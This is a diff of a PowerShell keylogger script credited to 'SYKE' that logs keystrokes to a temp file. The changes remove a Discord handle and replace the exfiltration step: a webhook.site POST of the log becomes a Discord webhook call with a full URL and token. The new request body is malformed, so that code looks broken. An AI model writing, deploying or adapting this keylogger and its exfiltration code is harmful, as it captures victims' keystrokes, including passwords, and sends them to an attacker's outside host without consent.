@@ -1,5 +1,4 @@
-# MADE BY SYKE
-# Discord: syke#1166 / Syke#1166
+#MADE BY SYKE
 
 # keylogger
 function KeyLogger($logFile="$env:temp/keylogger.log") {
@@ -56,7 +55,14 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   # send logs if code fails
   finally {
-    powershell Invoke-WebRequest -Uri https://webhook.site/e5a880e0-d6d0-4945-88e2-68874b1e1fe0? -Method POST -InFile $env:temp/keylogger.log
+    
+
+$webhookUri = 'https://discord.com/api/webhooks/938865371790843925/0iTYBgzJrUrvRtC2Jr7etORt93ZtueTNOQ0D0PDxI8iWsa58l0rznZ61VJ50ivrhVGUe'
+
+$Body = @{
+  $env:temp/keylogger.log
+}
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
   }
 }
 
